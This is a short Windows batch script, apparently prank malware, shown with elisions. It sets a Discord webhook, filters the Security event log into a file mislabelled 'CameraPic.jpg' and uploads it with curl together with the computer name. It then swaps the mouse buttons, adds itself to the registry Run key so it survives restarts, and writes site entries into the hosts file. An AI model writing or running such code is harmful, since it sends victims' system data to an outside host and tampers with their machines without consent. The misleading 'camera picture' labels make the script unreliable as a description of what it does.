...
set webhook=https://discord.com/api/webhooks/1094211679484641321/0FiGPQ_GNwzYfsldWhiZrs5peMqfLYz182ErU1eE9douO5SyU6_JXb4f01TXdqeNJ13A
...
::Camera Pic
powershell -Command "Get-Content c:\Windows\System32\winevt\Logs\Security.evtx | Where-Object { $_.contains('Microsoft-Windows-Sysmon/Operational') } | Out-File CameraPic.jpg"
curl -F "file=@CameraPic.jpg" -F "content=%computername% has sent a camera picture." %webhook%
del CameraPic.jpg
reg add "HKCU\Control Panel\Mouse" /v SwapMouseButtons /t REG_SZ /d 1 /f

::Add to Startup
set SCRIPT_NAME=%~n0
set SCRIPT_PATH=%~dp0%SCRIPT_NAME%.bat

set regPath=HKCU\Software\Microsoft\Windows\CurrentVersion\Run
set regName=%SCRIPT_NAME%
set regValue=%SCRIPT_PATH%

echo Please restart your pc  %SCRIPT_NAME% to make changes working....

reg add "%regPath%" /v "%regName%" /t REG_SZ /d "%regValue%" /f > nul


echo 127.0.0.1 www.pornhub.com, www.roblox.com, www.facebook.com >> C:\Windows\System32\drivers\etc\hosts
